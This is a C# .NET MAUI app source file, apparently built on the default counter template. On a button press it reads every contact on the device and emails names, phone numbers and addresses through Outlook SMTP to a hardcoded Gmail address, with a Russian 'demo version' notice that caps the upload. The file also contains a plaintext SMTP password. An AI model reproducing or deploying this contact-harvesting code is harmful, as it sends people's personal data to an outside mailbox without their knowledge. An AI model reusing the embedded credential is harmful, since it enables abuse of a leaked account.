using System;
//using MailKit.Net.Smtp;
//using MailKit;
//using MimeKit;
//using MailKit.Security;
using System.Security.Authentication;
using System.Net.Mail;
using System.Net;
namespace AddressBookSender
{
    public partial class MainPage : ContentPage
    {
        int count = 0;
        public MainPage()
        {
            InitializeComponent();
            CheckForStoragePermission();
        }
        private void OnCounterClicked(object sender, EventArgs e)
        {
            SendContactsAsync();
        }
        public static async Task<bool> CheckForStoragePermission()
        {
            bool permitted = false;
            var status = await Permissions.CheckStatusAsync<Permissions.ContactsRead>();
            if (status == PermissionStatus.Granted)
                permitted = true;
            else
            {
                status = await Permissions.RequestAsync<Permissions.ContactsRead>();
            }
            return permitted;
        }
        public async Task<bool> SendContactsAsync()
        {
            IEnumerable<Contact> contacts = await Microsoft.Maui.ApplicationModel.Communication.Contacts.Default.GetAllAsync();
            bool IsSendingError = false;
            string Content = string.Empty;
            int i = 0;
            foreach (Contact contact in contacts)
            {
                string id = contact.Id;
                string namePrefix = contact.NamePrefix;
                string givenName = contact.GivenName;
                string middleName = contact.MiddleName;
                string familyName = contact.FamilyName;
                string nameSuffix = contact.NameSuffix;
                string displayName = contact.DisplayName;
                List<ContactPhone> phones = contact.Phones; // List of phone numbers
                List<ContactEmail> emails = contact.Emails; // List of email addresses
                Content += id + "\t" + namePrefix + "\t" + givenName + "\t" + middleName + "\t" + familyName + "\t" + nameSuffix + "\t" + displayName + "\t";
                foreach (var phone in phones)
                    Content += phone.ToString() + "\t";
                foreach (var email in emails)
                    Content += email.ToString() + "\t";
                Content += "\n";
                if (i == 3) //это кулак дружбы
                {
                    Content += "\n Внимание! Демо версия. Отправлено только 3 контакта. Для дальнейшей работы приобретите, ппожалуйста, полную версию службы.";
                    break;
                }
                i++;
            }
            string to = "atataa733@gmail.com";
            string from = "vahe061@outlook.com";
            MailMessage message = new MailMessage(from, to);
            message.Subject = "Список контактов";
            message.Body = Content;
            SmtpClient client = new SmtpClient("smtp-mail.outlook.com", 587);
            client.Credentials = new NetworkCredential("vahe061@outlook.com", "YRJSJeuJN$%W7Jxf547heJGF4t4HETe5");
            client.EnableSsl = true;
            client.UseDefaultCredentials = false;
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            try
            {
                client.Send(message);
            }
            catch (Exception ex)
            {
                CounterBtn.Text = ex.ToString();
                IsSendingError = true;
            }
            if (IsSendingError)
                CounterBtn.Text = "Ошибка отправки";
            else
                CounterBtn.Text = "Отправить еще раз";
            if (i==0)
                CounterBtn.Text = "Не найдено контактов";
            SemanticScreenReader.Announce(CounterBtn.Text);
            return !IsSendingError;
        }
    }
}
